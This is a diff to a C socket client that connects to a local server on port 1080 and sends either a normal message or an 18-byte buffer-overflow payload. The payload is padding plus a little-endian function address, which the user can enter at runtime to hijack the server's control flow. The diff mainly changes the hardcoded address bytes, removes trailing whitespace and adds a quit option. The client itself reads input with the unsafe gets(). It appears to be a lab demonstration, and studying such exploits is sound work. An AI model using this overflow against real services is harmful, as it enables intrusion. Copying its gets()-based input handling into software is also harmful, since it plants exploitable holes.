@@ -1,21 +1,21 @@
-#include <stdio.h> 
-#include <netdb.h> 
-#include <netinet/in.h> 
-#include <stdlib.h> 
-#include <string.h> 
-#include <strings.h> 
-#include <sys/socket.h> 
-#include <sys/types.h> 
-#include <netinet/in.h> 
-#include <arpa/inet.h> 
+#include <stdio.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <stdlib.h>
+#include <string.h>
+#include <strings.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <unistd.h>
-#define MAX 80 
+#define MAX 80
 #define OVRFLOW_LEN 18
 #define NORMAL_LEN 10
-#define SRV_PORT 1080 
+#define SRV_PORT 1080
 
-#define SA struct sockaddr 
-  
+#define SA struct sockaddr
+
 int getNum(char ch)
 {
     int num=0;
@@ -50,59 +50,59 @@ unsigned int hex2int(unsigned char hex[])
     return x;
 }
 
-  
-// Driver function 
-int main() 
-{ 
-    int client_sockfd; 
+
+// Driver function
+int main()
+{
+    int client_sockfd;
     struct sockaddr_in servaddr;
     char answer[MAX];
     int i,j;
     char buff[MAX] = "aaaaaaaaaa";
-    buff[10] = 0x89;
-    buff[11] = 0x52;
-    buff[12] = 0x55;
+    buff[10] = 0x00;
+    buff[11] = 0x14;
+    buff[12] = 0x6f;
     buff[13] = 0x55;
     buff[14] = 0x55;
     buff[15] = 0x55;
     buff[16] = 0x00;
     buff[17] = 0x00;
 
-  
-    // socket create and varification 
-    client_sockfd = socket(AF_INET, SOCK_STREAM, 0); 
-    if (client_sockfd == -1) { 
-        printf("socket creation failed...\n"); 
-        exit(0); 
-    } 
+
+    // socket create and varification
+    client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (client_sockfd == -1) {
+        printf("socket creation failed...\n");
+        exit(0);
+    }
     else{
-        printf("Client Socket Created\n"); 
+        printf("Client Socket Created\n");
     }
 
     bzero((char *)&servaddr, sizeof(servaddr));
-    servaddr.sin_family = AF_INET; 
-    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
-    servaddr.sin_port = htons(SRV_PORT); 
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+    servaddr.sin_port = htons(SRV_PORT);
 
 
-    // connect the client socket to the server 
-    if (connect(client_sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) { 
-        printf("connection with the server failed...\n"); 
-        exit(0); 
-    } 
-    else{
-        printf("connected to the server..\n"); 
+    // connect the client socket to the server
+    if (connect(client_sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
+        printf("connection with the server failed...\n");
+        exit(0);
     }
- 
+    else{
+        printf("connected to the server..\n");
+    }
+
     while(1){
-       printf("<N>ormal or <O>verflow run?");
+       printf("<N>ormal or <O>verflow run?, <Q> to quit: ");
        gets(answer);
        printf("Answer %s\n",answer);
        if (answer[0]=='n' || answer[0]=='N'){
           printf("Normal\n");
           buff[NORMAL_LEN]='\0';
-          write(client_sockfd, buff, NORMAL_LEN);      
-       } else {
+          write(client_sockfd, buff, NORMAL_LEN);
+       } else if (answer[0]=='o' || answer[0]=='O') {
           printf("Overflow\n");
           printf("Function address:");
           gets(answer);
@@ -113,6 +113,9 @@ int main()
           buff[17] = 0x00;
           write(client_sockfd, buff, OVRFLOW_LEN);
        }
+       else if (answer[0]=='q' || answer[0]=='Q'){
+          break;
+       }
     }
-    close(client_sockfd); 
+    close(client_sockfd);
 }
